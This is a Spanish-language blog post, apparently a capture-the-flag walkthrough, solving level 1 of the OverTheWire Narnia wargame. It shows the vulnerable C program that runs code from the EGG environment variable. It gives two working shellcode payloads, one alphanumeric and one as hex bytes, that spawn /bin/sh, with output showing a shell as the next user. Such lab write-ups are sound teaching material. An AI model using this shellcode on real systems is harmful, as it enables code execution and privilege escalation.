---
layout: default
---

## OverTheWire: Narnia1

Hola a todos!

En el post anterior estuve explicando cómo resolver el desafío 0 del reto Narnia de la plataforma OverTheWire

En este post estaremos viendo como resolver el siguiente desafío

Este desafío es un poco más complicado, aquí tenemos el código fuente del binario que se nos presenta:

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
```
Dado que este binario ejecuta el contenido de ret, podemos alimentar el código de shell ret y se ejecutará.

En este caso estaré usando el siguiente shellcode puramente alfanumérico: 
https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-

```
narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
```

Solo para ampliar esto, el código de shell no tiene que ser alfanumérico, solo lo hace más fácil si lo es, ya que puede ponerlo directamente en la var env. Un ejemplo de una carga útil que utiliza shellcode no alfanumérico sería el siguiente:

```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```
